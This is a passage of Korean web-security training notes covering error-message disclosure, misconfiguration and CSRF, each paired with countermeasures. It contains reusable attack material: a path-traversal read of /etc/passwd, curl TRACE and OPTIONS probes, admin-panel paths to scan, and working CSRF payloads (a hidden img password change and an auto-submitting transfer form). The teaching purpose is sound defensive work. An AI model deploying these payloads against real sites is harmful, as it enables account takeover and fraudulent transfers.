Warning: include(/var/www/html/includes/../../../etc/passwd): failed to open stream

# 스택 트레이스 노출 (패키지 구조·버전 노출)
org.springframework.dao.DataAccessException: PreparedStatementCallback;
    at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible
    at com.example.shop.dao.UserDAOImpl.findUser(UserDAOImpl.java:45)
    at com.example.shop.service.UserServiceImpl.login(UserServiceImpl.java:22)

# 계정 존재 여부 노출
→ "해당 이메일로 가입된 계정이 없습니다"  ← 계정 열거 가능!
→ "비밀번호가 일치하지 않습니다"          ← 계정 존재 확인됨!
```

**공격자가 오류에서 얻는 정보**
```
① DB 종류/버전 → 해당 버전 취약점 탐색
② 테이블명/컬럼명 → SQL Injection 구문 작성
③ 서버 내부 경로 → 파일 포함/다운로드 경로 추측
④ 프레임워크/패키지 버전 → CVE 취약점 탐색
⑤ 유효 계정 목록 → 브루트 포스 대상 좁히기
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **공통 오류 페이지** | 기술 정보 없는 사용자 친화적 오류 페이지로 이동 |
| **일괄적 오류 메시지** | 로그인 실패 시 "아이디 또는 비밀번호가 올바르지 않습니다" (계정 존재 여부 미공개) |
| **예외 로깅 (서버 측)** | 상세 오류는 서버 로그에만 기록, 사용자에게 미노출 |
| **운영 환경 설정** | 운영 서버: `debug=False`, `display_errors=Off` |

```python
# 취약한 코드 — 예외를 그대로 출력
try:
    result = db.execute(query)
except Exception as e:
    return f"오류 발생: {e}"   # 스택 트레이스 노출!

# 안전한 코드 — 서버 로그만 기록, 사용자엔 일반 메시지
import logging
try:
    result = db.execute(query)
except Exception as e:
    logging.error(f"DB Error: {e}", exc_info=True)   # 서버 로그
    return "서비스 오류가 발생했습니다. 관리자에게 문의해주세요."
```

```java
// Spring Boot — 운영 환경 오류 페이지 설정
// application.properties
server.error.include-stacktrace=never
server.error.include-message=never
server.error.include-binding-errors=never
```

💬 **강사 보충**
> 로그인 실패 메시지가 "아이디가 없습니다" vs "비밀번호가 틀렸습니다"로 구분되면 공격자가 계정 존재 여부를 탐색할 수 있다 (계정 열거, Account Enumeration).
> 운영 환경에서 `debug=True`를 켜두는 실수가 매우 흔하다 — 개발할 때는 유용하지만 운영에서는 스택 트레이스가 그대로 노출된다.

## 12. 취약한 보안설정

**설명**: 기본값 그대로 운영되거나 불필요한 기능·메소드가 활성화되어 공격 표면이 넓어지는 취약점. 설정 오류(Security Misconfiguration)는 OWASP Top 10에서 꾸준히 상위권.

### 주요 취약 설정 유형

| 유형 | 취약한 상태 | 위험 |
|---|---|---|
| **불필요한 HTTP 메소드** | PUT, DELETE, TRACE, OPTIONS 활성화 | 파일 업로드, XST 공격 |
| **디렉터리 인덱싱** | `Options Indexes` 활성화 | 파일 목록 노출 |
| **기본 계정** | admin/admin, root/root 미변경 | 즉시 인증 우회 |
| **불필요한 서비스** | phpMyAdmin, 웹 콘솔, 테스트 페이지 외부 노출 | 관리 인터페이스 무단 접근 |
| **CORS 과도 허용** | `Access-Control-Allow-Origin: *` | 타 도메인에서 API 호출 |
| **HTTPS 미적용 / 혼합 콘텐츠** | HTTP 평문 통신 | 스니핑 |
| **클라우드 스토리지 공개** | S3 버킷 퍼블릭 설정 | 내부 파일 전체 공개 |

**취약한 HTTP 메소드 확인 (진단)**
```bash
# 허용된 메소드 확인
curl -X OPTIONS http://target.com -v

# 응답 예시 (취약)
Allow: GET, POST, PUT, DELETE, TRACE, OPTIONS

# TRACE 메소드 악용 (XST: Cross-Site Tracing)
curl -X TRACE http://target.com -H "Cookie: session=abc123"
→ 응답에 Cookie 헤더가 그대로 반사 → HttpOnly 쿠키도 우회 가능
```

**CORS 취약 설정 예시**
```
# 취약 — 모든 도메인 허용
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ← 이 조합은 특히 위험

# 안전
Access-Control-Allow-Origin: https://yourdomain.com
```

**phpMyAdmin 외부 노출**
```bash
# 자동화 탐색 예시
http://target.com/phpmyadmin/      ← DB 직접 관리
http://target.com/adminer.php      ← 경량 DB 관리 도구
http://target.com/manager/html     ← Tomcat Manager
```

**보안 대책**

| 항목 | 조치 |
|---|---|
| **불필요한 HTTP 메소드 제거** | GET, POST, HEAD만 허용 |
| **디렉터리 인덱싱 비활성화** | `Options -Indexes` |
| **기본 계정 변경** | 초기 설치 후 즉시 변경, 불필요한 계정 삭제 |
| **관리 도구 외부 차단** | phpMyAdmin, Tomcat Manager를 내부 IP만 허용 |
| **보안 헤더 설정** | CSP, HSTS, X-Frame-Options, X-Content-Type-Options |
| **CORS 화이트리스트** | `Access-Control-Allow-Origin`에 허용 도메인만 명시 |
| **정기 설정 점검** | CIS Benchmark, 클라우드 보안 점검 도구 활용 |

```apache
# Apache — 불필요한 메소드 차단
<LimitExcept GET POST HEAD>
    Order deny,allow
    Deny from all
</LimitExcept>

# 보안 응답 헤더
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

```nginx
# nginx — 불필요한 메소드 차단
if ($request_method !~ ^(GET|POST|HEAD)$) {
    return 405;
}

# 서버 버전 숨김
server_tokens off;
```

💬 **강사 보충**
> TRACE 메소드는 디버깅용이지만 운영에서 열려있으면 XST(Cross-Site Tracing) 공격에 악용된다 — 반드시 비활성화.
> 클라우드 환경에서 S3 버킷 퍼블릭 설정 실수로 수백만 건 개인정보가 유출되는 사고가 반복적으로 발생한다.
> 보안 헤더는 F12 개발자 도구 Network 탭에서 바로 확인 가능 — 진단 시 응답 헤더 확인을 루틴으로 포함할 것.

## 13. CSRF (Cross-Site Request Forgery) — 사이트 간 요청 위조 ⭐

**설명**: 인증된 사용자(피해자)의 브라우저를 통해 공격자가 의도한 요청을 서버에 강제로 보내는 공격.
사용자 모르게 비밀번호 변경, 계좌이체, 회원탈퇴 등 **상태 변경(State-Changing) 요청**을 유발한다.

> **XSS vs CSRF 비교**
> | | XSS | CSRF |
> |---|---|---|
> | 공격 대상 | 서버(사이트)를 신뢰하는 **사용자** | 사용자를 신뢰하는 **서버** |
> | 핵심 원리 | 악성 스크립트를 피해자 브라우저에서 실행 | 피해자의 인증 쿠키를 이용해 위조 요청 전송 |
> | 스크립트 필요 여부 | 필요 | 불필요 (img 태그 하나로도 가능) |
> | 탈취 대상 | 쿠키·세션·개인정보 | 서버 상의 상태(계좌잔고·설정 등) |

**공격(진단) 포인트**: 로그인 세션이 유지된 채로 처리되는 모든 **쓰기·변경·삭제 요청** (비밀번호 변경, 이체, 관리자 기능)

**해킹 시나리오**
```
① 공격자가 악성 페이지(또는 이메일) 제작
   - <img src="https://bank.com/transfer?to=attacker&amount=1000000">
   - 또는 자동 제출되는 <form action="..." method="POST">

② 피해자가 bank.com에 로그인된 상태로 악성 페이지 방문
   ↓
③ 피해자 브라우저가 (모르는 사이에) bank.com으로 요청 전송
   - 브라우저가 자동으로 세션 쿠키를 첨부
   ↓
④ 서버는 정상 인증된 요청으로 판단 → 이체 실행
```

**CSRF 공격 코드 예시**
```html
<!-- GET 방식 (이미지 태그 활용) -->
<img src="http://target.com/changepass?new=hacked123" width="0" height="0">

<!-- POST 방식 (자동 제출 폼) -->
<form id="csrf" action="http://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**보안 대책**

| 방어 기법 | 설명 |
|---|---|
| **CSRF Token** | 서버가 폼마다 예측 불가 토큰 발급 → 요청 시 토큰 검증 (가장 일반적) |
| **SameSite 쿠키** | `Set-Cookie: session=...; SameSite=Strict` — 외부 사이트에서 쿠키 전송 차단 |
| **Referer 검증** | 요청 헤더의 `Referer`가 자신의 도메인인지 확인 (우회 가능성 있어 보조 수단) |
| **이중 쿠키 검증** | 쿠키 값을 파라미터로도 전달, 서버에서 두 값 일치 여부 확인 |
| **CAPTCHA / 재인증** | 중요 작업(이체·비밀번호 변경) 시 재인증 요구 |
| **Custom Request Header** | AJAX 요청에 `X-Requested-With: XMLHttpRequest` 헤더 추가 (기본 폼 요청에는 미포함) |

**CSRF Token 동작 원리**
```
① 서버: 로그인 시 세션에 CSRF 토큰 저장, 폼에 hidden 필드로 삽입
   <input type="hidden" name="csrf_token" value="a8f3b9...">

② 클라이언트: 폼 제출 시 토큰 함께 전송

③ 서버: 세션의 토큰과 전달된 토큰 일치 여부 검증
   ✅ 일치 → 요청 처리
   ❌ 불일치 → 요청 거부 (403)

④ 공격자는 피해자의 토큰값을 모르기 때문에 위조 요청 실패
```

💬 **강사 보충**
> CSRF는 피해자가 로그인 상태여야 성립한다. 로그아웃하면 자동 방어됨.
> SameSite=Strict가 가장 강력하지만, OAuth처럼 외부 리다이렉트를 활용하는 서비스에선 `Lax`로 완화해야 한다.
> CSRF Token은 세션별이 아니라 **요청별**로 새로 발급해야 replay 공격을 막을 수 있다.
